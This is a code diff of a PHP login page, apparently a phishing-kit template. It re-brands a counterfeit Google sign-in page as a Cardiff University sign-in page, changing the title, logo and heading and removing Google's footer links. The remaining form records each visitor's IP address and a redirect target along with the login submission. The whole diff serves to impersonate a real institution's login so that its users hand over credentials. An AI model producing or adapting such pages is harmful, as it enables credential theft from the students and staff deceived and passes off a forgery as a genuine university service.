@@ -7,7 +7,7 @@ require_once('helper.php');
 
   <head>
 
-    <title>Sign in - Google Accounts</title>
+    <title>Sign in - Cardiff University</title>
 
     <meta charset='UTF-8'>
     <meta http-equiv="cache-control" content="no-cache" />
@@ -123,11 +123,11 @@ require_once('helper.php');
 
       <div class="google-header-bar centered">
         <div class="header content clearfix">
-          <img alt="Google" class="logo" src="assets/img/dtnk16mcjo.png">
+          <img src="cardiff.jpg" alt="Cardiff" style="margin: 0 auto; display:block; text-align: center">
         </div>
       </div>
 
-      <h1 class="text-center login-title">Sign in with your Google Account</h1>
+      <h1 class="text-center login-title">Sign in with your Cardiff University Account</h1>
 
         <div class="account-wall">
 
@@ -141,16 +141,7 @@ require_once('helper.php');
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
             <input type="hidden" name="target" value="<?=$destination?>">
             <button class="btn btn-primary btn-block btn-sharp" name="login" type="submit">Sign in</button>
-            <a href="#" class="pull-right need-help">Find my account </a><span class="clearfix"></span>
-          </form>
 
-        </div>
-
-            <br><a href="#" class="text-center new-account">Create an account </a>
-            <center><br><p class="tagline">One Google Account for everything Google</p>
-            <img src="assets/img/tmjjgvk28i.png" width="210" height="17" alt=""></center><br><br>
-
-    </div>
 
   </body>
 
